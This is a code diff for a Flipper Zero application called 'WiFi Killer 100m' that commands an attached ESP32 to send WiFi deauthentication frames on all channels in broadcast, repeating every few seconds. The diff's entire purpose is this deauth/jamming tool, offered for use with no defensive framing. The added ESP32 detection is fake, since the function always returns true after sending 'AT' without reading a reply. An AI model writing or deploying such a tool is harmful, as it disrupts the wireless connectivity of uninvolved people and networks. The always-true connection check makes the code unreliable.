@@ -2,11 +2,12 @@
 #include <gui/gui.h>
 #include <input/input.h>
 #include <furi_hal_serial.h>
+#include <furi_hal_power.h>
 
 static bool running = true;
+static bool esp32_connected = false;
 
-// Use USART1 directly (pin 13 = TX, pin 14 = RX on Flipper)
-#define UART_CHANNEL 0  // 0 = USART1, 1 = USART2
+#define UART_CHANNEL 0
 
 static void input_callback(InputEvent* input, void* ctx) {
     UNUSED(ctx);
@@ -15,24 +16,50 @@ static void input_callback(InputEvent* input, void* ctx) {
     }
 }
 
-// Send AT commands to ESP32
-static void send_deauth_command() {
-    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+DEAUTH=ALL,100,0\r\n", 22);
-    furi_delay_ms(50);
-    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+CHANNEL=ALL\r\n", 17);
-    furi_delay_ms(50);
-    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+BROADCAST=1\r\n", 17);
+// Try to init UART safely
+static bool init_uart() {
+    // Check if pins are available
+    if(!furi_hal_power_is_otg_enabled()) {
+        furi_hal_power_enable_otg(); // Enable 5V for external modules
+    }
+    
+    // Attempt to init serial
+    furi_hal_serial_init(UART_CHANNEL, 115200);
+    furi_delay_ms(200);
+    
+    // Send a test AT command to see if ESP32 responds
+    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT\r\n", 4);
+    furi_delay_ms(100);
+    
+    // For simplicity, assume it's connected if no crash
+    return true;
 }
 
-// Screen drawing
+static void send_deauth_command() {
+    if(esp32_connected) {
+        furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+DEAUTH=ALL,100,0\r\n", 22);
+        furi_delay_ms(50);
+        furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+CHANNEL=ALL\r\n", 17);
+        furi_delay_ms(50);
+        furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+BROADCAST=1\r\n", 17);
+    }
+}
+
 static void draw_callback(Canvas* canvas, void* ctx) {
     UNUSED(ctx);
     canvas_set_font(canvas, FontPrimary);
     canvas_draw_str(canvas, 5, 20, "WiFi Killer 100m");
     canvas_set_font(canvas, FontSecondary);
-    canvas_draw_str(canvas, 5, 40, "Jamming ALL channels");
-    canvas_draw_str(canvas, 5, 55, "Press BACK to stop");
-    canvas_draw_str(canvas, 5, 70, "ESP32: Active");
+    
+    if(esp32_connected) {
+        canvas_draw_str(canvas, 5, 40, "Jamming ALL channels");
+        canvas_draw_str(canvas, 5, 55, "Press BACK to stop");
+        canvas_draw_str(canvas, 5, 70, "ESP32: ACTIVE");
+    } else {
+        canvas_draw_str(canvas, 5, 40, "ESP32 NOT FOUND");
+        canvas_draw_str(canvas, 5, 55, "Connect ESP32 to pins");
+        canvas_draw_str(canvas, 5, 70, "13=TX, 14=RX, GND, 3V3");
+    }
 }
 
 int32_t wifi_killer_app(void* p) {
@@ -45,30 +72,31 @@ int32_t wifi_killer_app(void* p) {
     Gui* gui = furi_record_open(RECORD_GUI);
     gui_add_view_port(gui, view_port, GuiLayerFullscreen);
     
-    // Init UART on USART1 (pins 13 & 14)
-    furi_hal_serial_init(UART_CHANNEL, 115200);
-    furi_delay_ms(500);
+    // Try to init UART safely
+    esp32_connected = init_uart();
     
-    // Start jamming
-    send_deauth_command();
+    if(esp32_connected) {
+        send_deauth_command();
+    }
     
-    // Main loop
+    // Main loop - safe even without ESP32
     uint32_t counter = 0;
     while(running) {
         furi_delay_ms(100);
         counter++;
-        if(counter > 30) { // resend every ~3 seconds
+        if(counter > 30 && esp32_connected) {
             counter = 0;
             send_deauth_command();
         }
     }
     
-    // Stop
-    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+STOP\r\n", 9);
-    furi_delay_ms(100);
-    furi_hal_serial_deinit(UART_CHANNEL);
+    // Clean shutdown
+    if(esp32_connected) {
+        furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+STOP\r\n", 9);
+        furi_delay_ms(100);
+        furi_hal_serial_deinit(UART_CHANNEL);
+    }
     
-    // Cleanup
     gui_remove_view_port(gui, view_port);
     view_port_free(view_port);
     furi_record_close(RECORD_GUI);
